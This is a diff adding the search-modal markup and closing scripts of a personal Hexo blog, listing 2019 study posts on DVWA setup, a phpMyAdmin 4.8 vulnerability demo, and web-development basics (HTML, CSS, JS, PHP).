+            <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-times"></i></span>
+            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="/assets/images/logo-algolia-nebula-blue-full.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    />
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa-deploy"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa-deploy"
+                        >
+                            <h3 class="media-heading">dvwa-deploy</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: CentOS7部署DVWA</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin-bug"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin-bug"
+                        >
+                            <h3 class="media-heading">phpmyadmin-bug</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/noteday11/"
+                            aria-label=": note11"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/noteday11/"
+                            aria-label=": note11"
+                        >
+                            <h3 class="media-heading">note11</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 本文档主要记录2019/07/29学习的主要内容</p>
+<a id="more"></a></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": week2sum"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": week2sum"
+                        >
+                            <h3 class="media-heading">week2sum</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1367188/pexels-photo-1367188.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <h3 class="media-heading">markdown语法</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 用typora写markdown文档的语法</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1564414872027-5ae7dac9a76f?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=700&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <h3 class="media-heading">stage1知识盲点</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 知识盲点总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": note12"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": note12"
+                        >
+                            <h3 class="media-heading">note12</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初学HTML</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": note13"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": note13"
+                        >
+                            <h3 class="media-heading">note13</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初探CSS+JS</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": note14"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": note14"
+                        >
+                            <h3 class="media-heading">note14</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
+                        >
+                            <h3 class="media-heading">note15</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 3, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                45 posts found
+            </p>
+        </div>
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+    <script src="/assets/js/moment-with-locales.js"></script>
+    <script src="/assets/js/algoliasearch.js"></script>
+    <script>
+      var algoliaClient = algoliasearch('QHU2Y8U611', 'c66d405f4a2145e747c10a811d8acae2');
+      var algoliaIndex = algoliaClient.initIndex('tranquilpeak');
+    </script>
+
+
+    </body>
+</html>
